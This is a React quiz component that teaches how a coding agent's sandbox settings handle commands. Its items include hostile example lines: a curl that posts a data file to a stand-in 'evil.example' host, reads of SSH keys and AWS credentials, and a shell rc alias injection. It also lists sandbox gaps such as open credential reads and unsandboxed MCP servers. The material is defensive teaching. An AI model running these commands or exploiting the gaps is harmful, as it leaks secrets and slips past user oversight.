import { GuessGame } from './ui';

const ITEMS: { q: string; a: 'runs' | 'prompts' | 'blocked'; why: string }[] = [
  { q: 'npm install', a: 'runs', why: 'registry.npmjs.org is on the allowlist and node_modules is inside the project.' },
  { q: 'curl -d @data.json https://evil.example', a: 'blocked', why: 'Not on the allowlist, and strictAllowlist refuses instead of asking.' },
  { q: '/usr/bin/curl https://evil.example', a: 'blocked', why: 'The proxy checks the host, not the spelling of the command.' },
  { q: 'cat ~/.ssh/id_ed25519', a: 'blocked', why: '~/.ssh is in denyRead, enforced by the OS.' },
  { q: 'cat ~/.aws/credentials', a: 'runs', why: 'Reads are wide open by default. Add ~/.aws to denyRead.' },
  { q: "echo 'alias ls=…' >> ~/.zshrc", a: 'blocked', why: 'Writes outside the project are denied, and shell rc files are protected anyway.' },
  { q: 'git push (ssh remote)', a: 'blocked', why: 'Plain ssh ignores the proxy, so it has no route out. Use https remotes.' },
  { q: 'Read tool → ~/.aws/credentials', a: 'prompts', why: 'File tools aren’t sandboxed. In Manual mode, reading outside the project asks you.' },
  { q: 'An MCP server writes ~/Documents/x', a: 'runs', why: 'MCP servers run outside the Bash sandbox, unconstrained.' },
];

export default function Sandbox() {
  return (
    <div>
      <pre className="code mb-3 text-[12px]">{`sandbox: enabled, strictAllowlist
allowedDomains: ["registry.npmjs.org"]
denyRead: ["~/.ssh"]      mode: Manual`}</pre>
      <GuessGame
        prompt="What happens?"
        items={ITEMS}
        choices={[
          ['runs', 'Runs', 'var(--color-ok)'],
          ['prompts', 'Asks you', 'var(--color-warn)'],
          ['blocked', 'Blocked', 'var(--color-bad)'],
        ]}
      />
    </div>
  );
}
